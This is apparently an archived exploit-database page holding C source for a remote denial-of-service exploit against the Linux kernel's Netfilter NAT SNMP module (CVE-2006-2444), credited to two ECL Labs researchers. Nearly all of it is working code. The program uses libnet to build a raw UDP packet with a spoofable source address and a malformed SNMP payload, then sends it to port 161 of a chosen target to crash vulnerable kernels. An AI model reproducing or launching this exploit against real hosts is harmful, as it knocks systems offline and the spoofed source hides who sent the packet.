<html><head><title>Linux Kernel < 2.6.16.18 (Netfilter NAT SNMP Module) Remote DoS Exploit</title></head><pre>/*
 *  ecl-nf-snmpwn.c - 30/05/06
 *
 *  Alex Behar &lt;alex@ecl-labs.org&gt;
 *  Yuri Gushin &lt;yuri@ecl-labs.org&gt;
 *  
 *  A patch review we did on the 2.6.16.17-&gt;18 Linux kernel source tree revealed
 * a restructuring of code in the snmp_parse_mangle() and the snmp_trap_decode()
 * functions. After further research it turned out to be a vulnerability
 * previously reported[1] and assigned with CVE-2006-2444. For more details,
 * the version change log.
 *
 *
 *
 * 1) http://kernel.org/pub/linux/kernel/v2.6/ChangeLog-2.6.16.18
 *
 * -- 
 * Greets fly out to the ECL crew - Valentin Slavov, Dimityr Manevski. 
 * To stranger, shrink, the Console Pimps crew (blexim, ex0, hugin, w00f, matt,
 * kyu, kbd and the rest), our favorite soldier boy Sagi Horev, the SigMIL crew,
 * izik, tanin00, and everyone else we left out. 
 *
 * P.S. - blexim, how are your FACECRABS ???? :))))
 *
 */


#ifndef _BSD_SOURCE
#define _BSD_SOURCE
#endif
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;time.h&gt;
#include &lt;libnet.h&gt;

void banner();
void usage(char *);

char pwnage[] = &quot;\x30\x0a\x02\x01\x00\x04\x03\x45\x43\x4c\xa4\x00&quot;;

int main(int argc, char **argv)
{
	char errbuf[LIBNET_ERRBUF_SIZE];
	libnet_t *l;
	int c;
	u_char *buf;
	int packet_len = 0;
	struct ip *IP;
	struct udphdr *UDP;
	u_int32_t src = 0, dst = 0;


	banner();

	if (argc &lt; 3) usage(argv[0]);

	if ((l = libnet_init(LIBNET_RAW4, NULL, errbuf)) == NULL) {
		fprintf(stderr, &quot;[!] libnet_init() failed: %s&quot;, errbuf);
		exit(-1);
	}

	if ((src = libnet_name2addr4(l, argv[1], LIBNET_RESOLVE)) == -1) {
		fprintf(stderr, &quot;[!] Unresolved source address.\n&quot;);
		exit(-1);
	}
	if ((dst = libnet_name2addr4(l, argv[2], LIBNET_RESOLVE)) == -1) {
		fprintf(stderr, &quot;[!] Unresolved destination address.\n&quot;);
		exit(-1);
	}

	if ((buf = malloc(IP_MAXPACKET)) == NULL) {
		perror(&quot;malloc&quot;);
		exit(-1);
	}

	UDP = (struct udphdr *)(buf + LIBNET_IPV4_H);

	packet_len = LIBNET_IPV4_H + LIBNET_UDP_H + sizeof(pwnage) - 1;

	srand(time(NULL));
	IP = (struct ip *) buf;
	IP-&gt;ip_v    = 4;                   /* version 4 */
	IP-&gt;ip_hl   = 5;		     /* header length */
	IP-&gt;ip_tos  = 0;                   /* IP tos */
	IP-&gt;ip_len  = htons(packet_len);   /* total length */
	IP-&gt;ip_id   = rand();              /* IP ID */
	IP-&gt;ip_off  = htons(0);            /* fragmentation flags */
	IP-&gt;ip_ttl  = 64;                  /* time to live */
	IP-&gt;ip_p    = IPPROTO_UDP;         /* transport protocol */
	IP-&gt;ip_sum  = 0;
	IP-&gt;ip_src.s_addr = src;
	IP-&gt;ip_dst.s_addr = dst;

	UDP-&gt;uh_sport = rand();
	UDP-&gt;uh_dport = (argc &gt; 3) ? htons((u_short)atoi(argv[3])) : htons(161);
	UDP-&gt;uh_ulen = htons(LIBNET_UDP_H + sizeof(pwnage) - 1);
	UDP-&gt;uh_sum = 0;

	memcpy(buf + LIBNET_IPV4_H + LIBNET_UDP_H, pwnage, sizeof(pwnage) - 1);

	libnet_do_checksum(l, (u_int8_t *)buf, IPPROTO_UDP, packet_len - LIBNET_IPV4_H);

	if ((c = libnet_write_raw_ipv4(l, buf, packet_len)) == -1)
	{
		fprintf(stderr, &quot;[!] Write error: %s\n&quot;, libnet_geterror(l));
		exit(-1);
	}

	printf(&quot;[+] Packet sent.\n&quot;);

	libnet_destroy(l);
	free(buf);
	return (0);
}

void usage(char *cmd)
{
	printf(&quot;[!] Usage: %s &lt;source&gt; &lt;destination&gt; [port]\n&quot;, cmd);
	exit(-1);
}

void banner()
{
	printf(&quot;\t\tNetfilter NAT SNMP module DoS exploit\n&quot;
			&quot;\t\t   Yuri Gushin &lt;yuri@ecl-labs.org&gt;\n&quot;
			&quot;\t\t    Alex Behar &lt;alex@ecl-labs.org&gt;\n&quot;
			&quot;\t\t\t       ECL Team\n\n\n&quot;);
}

// milw0rm.com [2006-06-05]</pre></html>